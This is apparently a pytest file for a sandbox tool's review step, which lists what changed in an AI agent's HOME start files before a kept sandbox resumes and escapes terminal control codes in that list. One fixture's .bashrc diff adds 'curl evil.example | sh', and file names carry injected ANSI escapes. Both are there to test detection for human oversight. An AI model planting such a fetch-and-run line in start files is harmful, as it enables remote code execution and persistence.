"""The question before a kept start is resumed: what changed in its HOME's start files (no Qt)."""
from sandbox_ai_app.reviews import home_review, review_refusal


def data(changes, complete=True):
    return {"name": "work", "state": "stopped", "pending": True,
            "review": {"since": "2026-11-07T10:00:00Z", "changes": changes, "complete": complete}}


def test_nothing_is_asked_when_nothing_changed_or_nothing_was_recorded():
    assert home_review("work", data([])) is None
    assert home_review("work", {"name": "work", "review": None}) is None, "no record of its HOME yet"
    assert home_review("work", "junk") is None and home_review("work", {"review": "junk"}) is None


def test_the_changes_are_named_escaped_and_their_differences_are_the_details():
    changes = [{"path": ".bashrc", "change": "changed", "diff": "--- a\n+++ b\n+curl evil.example | sh\x1b[2J"},
               {"path": ".claude/settings.json\x1b[31m", "change": "added"},
               {"path": ".ssh/config", "change": "mode", "note": "mode 0o600 -> 0o644"}] + \
              [{"path": f"f{i}", "change": "removed"} for i in range(25)]
    text, details = home_review("work", data(changes))
    assert "The HOME of work changed since its last start (2026-11-07T10:00:00Z)" in text
    assert "  changed  .bashrc" in text and "  permissions  .ssh/config" in text
    assert "\x1b" not in text and "\x1b" not in details, "the agent wrote these names: escaped"
    assert "… and 8 more" in text and "f24" not in text, "20 named, the rest counted"
    assert "sandbox-ai resume work --review-home" in text
    assert "+curl evil.example | sh" in details and "mode 0o600 -> 0o644" in details


def test_an_incomplete_review_is_said_and_another_host_is_named_in_the_command():
    text, details = home_review("web", data([], complete=False), host="ct1")
    assert "not every change is named" in text and details is None
    assert "sandbox-ai hosts run ct1 -- resume web --review-home" in text


def test_a_start_that_keeps_no_home_is_resumed_without_a_question():
    assert review_refusal(ValueError("sandbox-ai: claude-1 keeps no HOME: there is nothing to review"))
    assert not review_refusal(ValueError("ssh: connect to host ct1: Connection timed out"))
